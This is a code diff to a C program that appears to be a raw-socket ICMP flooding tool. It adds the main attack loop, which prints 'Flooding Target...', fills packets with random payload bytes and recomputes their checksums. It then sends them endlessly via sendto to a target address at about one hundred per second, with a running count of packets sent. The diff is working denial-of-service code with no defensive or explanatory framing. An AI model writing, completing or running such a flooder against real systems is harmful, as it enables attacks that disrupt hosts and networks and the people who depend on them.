@@ -147,7 +147,28 @@ int main ( int argc, char *argv[ ] ) {
 
   puts("Flooding Target...");
 
-  
+  while(1) {
+
+    memset(packet + sizeof(struct ip) + sizeof(struct icmp), rand() % 255, payload_size);
+    
+    //calculate icmp header checksum
+    icmphdr->icmp_cksum = 0;
+    icmphdr->icmp_cksum = in_cksum( (unsigned short *)icmp, sizeof(struct icmp) + payload_size );
+
+    if( ( sent_size = sendto( sockfd, packet, packet_size, 0, (struct sockaddr *) &servaddr, sizeof(servaddr) ) ) < 1 ) {
+      perror("Packet Send Failed");
+      break;
+    }
+    ++sent;
+    printf("%d packets sent\r", sent);
+    fflush(stdout);
+
+    usleep(10000);
+
+  }
+
+  free(packet);
+  close(sockfd);
 
   return 0;
 }
